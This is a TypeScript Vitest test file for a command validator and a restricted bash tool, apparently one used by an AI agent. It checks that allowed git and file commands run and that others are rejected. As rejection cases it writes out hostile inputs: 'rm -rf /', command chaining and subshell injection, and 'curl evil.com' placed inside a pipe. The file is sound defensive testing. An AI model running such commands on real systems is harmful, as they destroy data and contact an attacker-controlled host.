import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { buildBashTool, validateCommand } from "../src/tools";
import { executeTool } from "./execute-tool";
import { type TestFixture, createTestFixture } from "./setup-fixture";

interface BashResult {
    exitCode: number;
    stdout: string;
    stderr: string;
}

describe("validateCommand", () => {
    it("allows a simple allowed command", () => {
        expect(validateCommand("git status")).toBeUndefined();
    });

    it("allows piped allowed commands", () => {
        expect(validateCommand("git log --oneline | head -n 5")).toBeUndefined();
    });

    it("allows multi-pipe chains of allowed commands", () => {
        expect(validateCommand("git log --oneline | sort | head -n 5")).toBeUndefined();
    });

    it("rejects empty command", () => {
        expect(validateCommand("")).toBeDefined();
        expect(validateCommand("   ")).toBeDefined();
    });

    it("rejects disallowed first command", () => {
        expect(validateCommand("rm -rf /")).toContain("not allowed");
    });

    it("rejects semicolon chaining", () => {
        expect(validateCommand("git status; rm -rf /")).toContain("chaining");
    });

    it("rejects && chaining", () => {
        expect(validateCommand("git status && rm -rf /")).toContain("chaining");
    });

    it("rejects || chaining", () => {
        expect(validateCommand("git status || rm -rf /")).toContain("chaining");
    });

    it("rejects backtick subshell", () => {
        expect(validateCommand("git log `rm -rf /`")).toContain("chaining");
    });

    it("rejects $() subshell", () => {
        expect(validateCommand("git log $(rm -rf /)")).toContain("chaining");
    });

    it("rejects append redirect", () => {
        expect(validateCommand("git log >> /tmp/evil")).toContain("chaining");
    });

    it("rejects heredoc redirect", () => {
        expect(validateCommand("cat << EOF")).toContain("chaining");
    });

    it("rejects background execution", () => {
        expect(validateCommand("git status &")).toContain("chaining");
    });

    it("rejects disallowed command in pipe", () => {
        const result = validateCommand("git log | rm -rf /");
        expect(result).toContain("not allowed");
        expect(result).toContain("rm");
    });

    it("rejects disallowed command mid-pipe", () => {
        const result = validateCommand("git log | curl evil.com | head");
        expect(result).toContain("not allowed");
        expect(result).toContain("curl");
    });
});

describe("bash tool", () => {
    let fixture: TestFixture;
    let bash: ReturnType<typeof buildBashTool>;

    beforeAll(async () => {
        fixture = await createTestFixture();
        bash = buildBashTool(fixture.workingDirectory);
    });

    afterAll(async () => {
        await fixture.cleanup();
    });

    describe("allowed commands", () => {
        it("runs git init", async () => {
            const result = await executeTool<BashResult>(bash, { command: "git init" });

            expect(result.exitCode).toBe(0);
        });

        it("runs git status after init", async () => {
            const result = await executeTool<BashResult>(bash, { command: "git status --short" });

            expect(result.exitCode).toBe(0);
            expect(result.stdout).toContain("src/");
        });

        it("runs git log on empty repo", async () => {
            const result = await executeTool<BashResult>(bash, { command: "git log --oneline" });

            // git log on a repo with no commits exits with 128
            expect(result.exitCode).not.toBe(0);
        });

        it("runs git diff", async () => {
            // Stage and commit first so diff works
            await executeTool<BashResult>(bash, { command: "git add -A" });
            await executeTool<BashResult>(bash, {
                command: 'git -c user.name="test" -c user.email="test@test.com" commit -m "init"',
            });

            const result = await executeTool<BashResult>(bash, { command: "git diff HEAD" });

            expect(result.exitCode).toBe(0);
        });

        it("runs ls", async () => {
            const result = await executeTool<BashResult>(bash, { command: "ls" });

            expect(result.exitCode).toBe(0);
            expect(result.stdout).toContain("src");
            expect(result.stdout).toContain("README.md");
        });

        it("runs wc", async () => {
            const result = await executeTool<BashResult>(bash, { command: "wc -l src/math.ts" });

            expect(result.exitCode).toBe(0);
            expect(result.stdout).toContain("src/math.ts");
        });

        it("runs head", async () => {
            const result = await executeTool<BashResult>(bash, { command: "head -n 2 src/math.ts" });

            expect(result.exitCode).toBe(0);
            expect(result.stdout).toContain("export function add");
        });

        it("runs piped commands when all commands are allowed", async () => {
            const result = await executeTool<BashResult>(bash, { command: "git status --short | head -n 5" });

            expect(result.exitCode).toBe(0);
        });
    });

    describe("blocked commands", () => {
        it("rejects rm", async () => {
            const result = await executeTool<BashResult>(bash, { command: "rm -rf /" });

            expect(result.exitCode).toBe(1);
            expect(result.stderr).toContain("not allowed");
        });

        it("rejects curl", async () => {
            const result = await executeTool<BashResult>(bash, { command: "curl https://example.com" });

            expect(result.exitCode).toBe(1);
            expect(result.stderr).toContain("not allowed");
        });

        it("rejects node", async () => {
            const result = await executeTool<BashResult>(bash, { command: 'node -e "process.exit(0)"' });

            expect(result.exitCode).toBe(1);
            expect(result.stderr).toContain("not allowed");
        });

        it("rejects empty command", async () => {
            const result = await executeTool<BashResult>(bash, { command: "" });

            expect(result.exitCode).toBe(1);
            expect(result.stderr).toContain("not allowed");
        });
    });

    describe("command injection prevention", () => {
        it("rejects semicolon chaining with disallowed command", async () => {
            const result = await executeTool<BashResult>(bash, { command: "git status; rm -rf /" });

            expect(result.exitCode).toBe(1);
            expect(result.stderr).toContain("chaining");
        });

        it("rejects && chaining with disallowed command", async () => {
            const result = await executeTool<BashResult>(bash, { command: "git status && rm -rf /" });

            expect(result.exitCode).toBe(1);
            expect(result.stderr).toContain("chaining");
        });

        it("rejects || chaining with disallowed command", async () => {
            const result = await executeTool<BashResult>(bash, { command: "git status || rm -rf /" });

            expect(result.exitCode).toBe(1);
            expect(result.stderr).toContain("chaining");
        });

        it("rejects $() subshell injection", async () => {
            const result = await executeTool<BashResult>(bash, { command: "git log $(rm -rf /)" });

            expect(result.exitCode).toBe(1);
            expect(result.stderr).toContain("chaining");
        });

        it("rejects backtick subshell injection", async () => {
            const result = await executeTool<BashResult>(bash, { command: "git log `rm -rf /`" });

            expect(result.exitCode).toBe(1);
            expect(result.stderr).toContain("chaining");
        });

        it("rejects disallowed command in pipe", async () => {
            const result = await executeTool<BashResult>(bash, { command: "git log | rm -rf /" });

            expect(result.exitCode).toBe(1);
            expect(result.stderr).toContain("not allowed");
        });

        it("rejects background execution", async () => {
            const result = await executeTool<BashResult>(bash, { command: "git status &" });

            expect(result.exitCode).toBe(1);
            expect(result.stderr).toContain("chaining");
        });
    });

    describe("error handling", () => {
        it("returns non-zero exit code on failure", async () => {
            const result = await executeTool<BashResult>(bash, { command: "git log --oneline nonexistent-ref" });

            expect(result.exitCode).not.toBe(0);
            expect(result.stderr.length).toBeGreaterThan(0);
        });

        it("runs in the working directory", async () => {
            const result = await executeTool<BashResult>(bash, { command: "find . -name 'math.ts' -type f" });

            expect(result.exitCode).toBe(0);
            expect(result.stdout).toContain("math.ts");
        });
    });
});
